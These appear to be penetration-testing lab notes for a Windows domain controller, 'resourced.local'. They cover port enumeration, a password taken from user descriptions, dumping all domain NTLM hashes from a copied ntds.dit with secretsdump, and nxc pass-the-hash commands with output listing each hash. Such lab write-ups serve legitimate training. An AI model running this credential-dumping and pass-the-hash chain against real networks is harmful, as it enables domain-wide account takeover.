
**My IP:**
```
192.168.45.207
```

**Target IP:**
```
192.168.207.175
```

# nmap:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-26 21:42:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-09-25T21:39:34
|_Not valid after:  2027-03-27T21:39:34
|_ssl-date: 2026-09-26T21:43:57+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-26T21:43:17+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-26T21:43:20
|_  start_date: N/A

```

## http ports:

**Port 5985:**
- 404 Error, dead end![[Pasted image 20260926150341.png]]

**Port 593/49674:**
- Dead end (hangs forever when trying to browse to it, likely cause its not a real http web page)

**Port 88:**
- Consider AS-Reproasting when you have a list of users

**Port 139/445:**
- Tried anonymous access, was successful but unable to list out available shares. ![[Pasted image 20260926150258.png]]
- Given that we were able to connect anonymously but not list shares, we can still try RID Brute with enum4linux ![[Pasted image 20260930210111.png]]
- Here we can see were were able to get a list of users along with a description for each
	- One thing I learned was that enum4linux `-a` tries enumeration technique in the book (in simple terms), but most importantly it tries the LSA lookupsids tool to try and enumerate users, and it tries enumerating through rpcclient. rpcclient is the winner here as thats how we found these list of users. This screen shot shows LSA lookup failed ->![[Pasted image 20260930211035.png]]

- Now we can try these creds (**V.Ventz:HotelCalifornia194!**) with something like SMB to see if we can now access shares. ![[Pasted image 20260930211551.png]]
- Here we see we have read access over the `Password Audit` share. We should see whats in there.![[Pasted image 20260930212539.png]]
- The ntds.dit file holds all the hashes to all of the users under the DC (not locally on the DC machine but all user accounts in AD I think). However its encrypted and the only way to grab those hashes is with the SYSTEM file. 
- I ended up pulling all the files over, and ended up using the impacket-secretsdump tool to extract the user hashes.![[Pasted image 20260930222943.png]]
- Here is our hashes, and now we need to find who is the one of most interest. Observing our enum4linux output, the description for L.Livingstone says `sysadmin`. They likely have permissions that the other user accounts don't. Either that or Administrator. We can try and crack both with hashcat, or just use PTH (worse case scenario if we can't crack)
	- I was not able to crack either of the password hashes, even when using the best64 rule.
- I ended up saving the output from the secrets dump into two different files; one with just usernames, and another with just the NTLM hashes for each of the users. 
- Using nxc I decided to test each hash to see if it was possible to use against any of the services avail in our nmap scan (SMB,WinRM, and RDP).

# nxc output:
```nxc rdp 192.168.207.175 -u users.txt -H hashes.txt --no-bruteforce  
RDP         192.168.207.175 3389   RESOURCEDC       [*] Windows 10 or Windows Server 2016 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (nla:False)
RDP         192.168.207.175 3389   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f (STATUS_LOGON_FAILURE)
RDP         192.168.207.175 3389   RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 (STATUS_ACCOUNT_DISABLED)
RDP         192.168.207.175 3389   RESOURCEDC       [-] resourced.local\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d (STATUS_LOGON_FAILURE)
RDP         192.168.207.175 3389   RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b (STATUS_LOGON_FAILURE)
RDP         192.168.207.175 3389   RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 (STATUS_PASSWORD_EXPIRED)
RDP         192.168.207.175 3389   RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c (STATUS_PASSWORD_EXPIRED)
RDP         192.168.207.175 3389   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)


nxc smb 192.168.207.175 -u users.txt -H hashes.txt --no-bruteforce  
SMB         192.168.207.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.207.175 445    RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE 
SMB         192.168.207.175 445    RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED 
SMB         192.168.207.175 445    RESOURCEDC       [-] resourced.local\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE 
SMB         192.168.207.175 445    RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE 
SMB         192.168.207.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED 
SMB         192.168.207.175 445    RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED 
SMB         192.168.207.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 
  
  
nxc winrm 192.168.207.175 -u users.txt -H hashes.txt --no-bruteforce
WINRM       192.168.207.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) 
WINRM       192.168.207.175 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.207.175 5985   RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0
WINRM       192.168.207.175 5985   RESOURCEDC       [-] resourced.local\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d
WINRM       192.168.207.175 5985   RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b
WINRM       192.168.207.175 5985   RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45
WINRM       192.168.207.175 5985   RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c
WINRM       192.168.207.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)

```

- With this output we find that for both WinRM and RDP we have the ability to use the hash as an authentication method. However, WinRM is typically the expected method. 



**Port 389:**
- Anonymous bind succeeds ([+] resourced.local\:) but anonymous search is blocked 
  (000004DC: ...successful bind must be completed). → LDAP is a dead end without creds.![[Pasted image 20260926150746.png]]



**Port 5985:**
- 
